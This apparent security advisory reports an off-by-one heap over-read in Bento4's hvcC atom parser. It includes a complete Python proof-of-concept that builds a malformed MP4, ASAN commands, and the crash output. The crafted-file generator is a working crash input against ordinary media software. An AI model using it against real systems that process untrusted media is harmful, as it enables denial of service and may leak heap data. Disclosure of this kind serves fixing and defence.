## Bug0: Off-by-One Heap OOB Read in AP4_HvccAtom Payload Parser

In `AP4_HvccAtom::AP4_HvccAtom(AP4_UI32 size, const AP4_UI08* payload)` in `Bento4/Source/C++/Core/Ap4HvccAtom.cpp`, the guard condition `if (payload_size < 22) return;` at line 252 uses strict less-than instead of less-than-or-equal, so when `payload_size` is exactly 22 the check passes and `payload[22]` at line 282 reads one byte past the end of the 22-byte heap allocation, causing a heap-buffer-overflow.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct
import os

def box(fourcc, data=b''):
    if isinstance(fourcc, str):
        fourcc = fourcc.encode('ascii')
    size = 8 + len(data)
    return struct.pack('>I4s', size, fourcc) + data

def fullbox(fourcc, version, flags, data=b''):
    vf = struct.pack('>I', ((version & 0xFF) << 24) | (flags & 0xFFFFFF))
    return box(fourcc, vf + data)

hvcc_payload = bytes([
    0x01,
    0x01,
    0x60, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00,
    0x00, 0x00,
    0x00,
    0x01,
    0x00,
    0x00,
    0x00, 0x00,
    0x00,
])
assert len(hvcc_payload) == 22

hvcc_box = struct.pack('>I4s', 30, b'hvcC') + hvcc_payload
assert len(hvcc_box) == 30

visual_extra = (
    struct.pack('>HH', 0, 0)
    + b'\x00' * 12
    + struct.pack('>HH', 0, 0)
    + struct.pack('>II', 0x00480000, 0x00480000)
    + struct.pack('>I', 0)
    + struct.pack('>H', 1)
    + b'\x00' * 32
    + struct.pack('>H', 0x0018)
    + struct.pack('>h', -1)
)
assert len(visual_extra) == 70

hvc1_payload = (
    b'\x00' * 6
    + struct.pack('>H', 1)
    + visual_extra
    + hvcc_box
)
hvc1_box = box('hvc1', hvc1_payload)
assert len(hvc1_box) == 116

stsd_box = fullbox('stsd', 0, 0, struct.pack('>I', 1) + hvc1_box)
stts_box = fullbox('stts', 0, 0, struct.pack('>I', 0))
stsc_box = fullbox('stsc', 0, 0, struct.pack('>I', 0))
stsz_box = fullbox('stsz', 0, 0, struct.pack('>II', 0, 0))
stco_box = fullbox('stco', 0, 0, struct.pack('>I', 0))
stbl_box = box('stbl', stsd_box + stts_box + stsc_box + stsz_box + stco_box)

vmhd_box = fullbox('vmhd', 0, 1, struct.pack('>H', 0) + b'\x00' * 6)
url_box = fullbox('url ', 0, 1)
dref_box = fullbox('dref', 0, 0, struct.pack('>I', 1) + url_box)
dinf_box = box('dinf', dref_box)
minf_box = box('minf', vmhd_box + dinf_box + stbl_box)

mdhd_box = fullbox('mdhd', 0, 0,
    struct.pack('>IIII', 0, 0, 90000, 0) + struct.pack('>HH', 0x55C4, 0))
hdlr_box = fullbox('hdlr', 0, 0,
    struct.pack('>I', 0) + b'vide' + b'\x00' * 12 + b'Video\x00')
mdia_box = box('mdia', mdhd_box + hdlr_box + minf_box)

tkhd_box = fullbox('tkhd', 0, 3,
    struct.pack('>IIIII', 0, 0, 1, 0, 0)
    + b'\x00' * 8
    + struct.pack('>HHHH', 0, 0, 0, 0)
    + struct.pack('>9I', 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)
    + struct.pack('>II', 0, 0))
trak_box = box('trak', tkhd_box + mdia_box)

mvhd_box = fullbox('mvhd', 0, 0,
    struct.pack('>IIIII', 0, 0, 90000, 0, 0x00010000)
    + struct.pack('>H', 0x0100)
    + b'\x00' * 10
    + struct.pack('>9I', 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)
    + b'\x00' * 24
    + struct.pack('>I', 2))
moov_box = box('moov', mvhd_box + trak_box)

ftyp_box = box('ftyp', b'isom' + struct.pack('>I', 0) + b'isom')

mp4_data = ftyp_box + moov_box
with open('poc_input.mp4', 'wb') as f:
    f.write(mp4_data)
print(f"[+] Written: poc_input.mp4 ({len(mp4_data)} bytes)")
print("[+] hvcC box: size=30, payload=22 bytes")
print("[+] Trigger: AP4_HvccAtom ctor reads payload[22] (OOB) at Ap4HvccAtom.cpp:282")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x5030000002c6 at pc 0x55a30c64d32e bp 0x7ffcefed5870 sp 0x7ffcefed5860
READ of size 1 at 0x5030000002c6 thread T0
    #0 0x55a30c64d32d in AP4_HvccAtom::AP4_HvccAtom(unsigned int, unsigned char const*)
    #1 0x55a30c64e2ba in AP4_HvccAtom::Create(unsigned int, AP4_ByteStream&)
0x5030000002c6 is located 0 bytes to the right of 22-byte region [0x5030000002b0,0x5030000002c6)

### Impact

An attacker who supplies a crafted MP4 file with an hvcC box of size 30 can trigger a one-byte heap-buffer-overflow read in `AP4_HvccAtom::AP4_HvccAtom`, causing the process to crash (denial of service) under any invocation of `mp42aac` on untrusted input. The out-of-bounds byte value drives `m_Sequences.SetItemCount(num_seq)`, which may allocate up to 255 sequence objects based on heap metadata or adjacent heap content, creating a potential for heap layout information disclosure. While the read is limited to one byte past the allocation boundary and arbitrary code execution is unlikely under normal heap conditions, the bug is reliably triggerable with a minimal malformed file.
